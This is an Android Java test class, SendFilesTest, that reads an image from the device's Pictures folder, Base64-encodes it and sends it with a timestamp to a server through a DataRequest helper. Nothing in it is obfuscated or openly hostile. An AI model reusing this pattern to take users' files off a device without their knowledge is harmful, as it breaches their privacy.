package com.inet.android.request;

import java.io.IOException;

import org.apache.commons.io.output.ByteArrayOutputStream;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import android.util.Base64;

import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

public class SendFilesTest {
	private Context mContext;
	private String LOG_TAG = "SendFilesTest";

	public SendFilesTest(Context ctx) {
		this.mContext = ctx;
	}

	public void sendTest() {
		String sendJSONStr = null;
		JSONObject object = new JSONObject();
		ConvertDate getDate = new ConvertDate();
		String appName = "NBC";
		String galleryPath = Environment.getExternalStoragePublicDirectory(
				Environment.DIRECTORY_PICTURES).toString();
		String albumPath1 = galleryPath + "/" + appName;
		String path = albumPath1 + "/" + "NBC.bmp";
		try {
			object.put("time", getDate.logTime());
			object.put("type", "21");
			object.put("path", path);
			object.put("image", encodeFileToBase64Binary(path));

			// sendJSONStr = jsonObject.toString();
			sendJSONStr = object.toString();
		} catch (JSONException e) {
			Logging.doLog(LOG_TAG, "json сломался", "json сломался");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		DataRequest file = new DataRequest(mContext);
		file.sendRequest(sendJSONStr); // добавить строку request
	}

	public String encodeFileToBase64Binary(String fileName) throws IOException {

//		File file = new File(fileName);
		String encoded = null;
		Logging.doLog(LOG_TAG, "byte[] bytes", "byte[] bytes");
		Bitmap bm = BitmapFactory.decodeFile(fileName);
		ByteArrayOutputStream baos = new ByteArrayOutputStream();  
		bm.compress(Bitmap.CompressFormat.JPEG, 100, baos); //bm is the bitmap object   
		byte[] imageData = baos.toByteArray(); 
		// Reading a Image file from file system
//			FileInputStream imageInFile = new FileInputStream(file);
//			BufferedImage bufferedImage = ImageIO.read(imgPath);
//			byte imageData[] = org.apache.commons.io.FileUtils
//					.readFileToByteArray(file);
		// byte imageData[] = new byte[(int) file.length()];
//			imageInFile.read(imageData);

		// Converting Image byte array into Base64 String
		encoded = Base64.encodeToString(imageData, Base64.DEFAULT);
		// byte[] bytes = FileUtils.readFileToByteArray(file);
		// Logging.doLog(LOG_TAG , "encoded", "encoded");
		// String encoded = Base64.encodeToString(bytes, 0);
		// bytes = null;
		return encoded;
	}
}
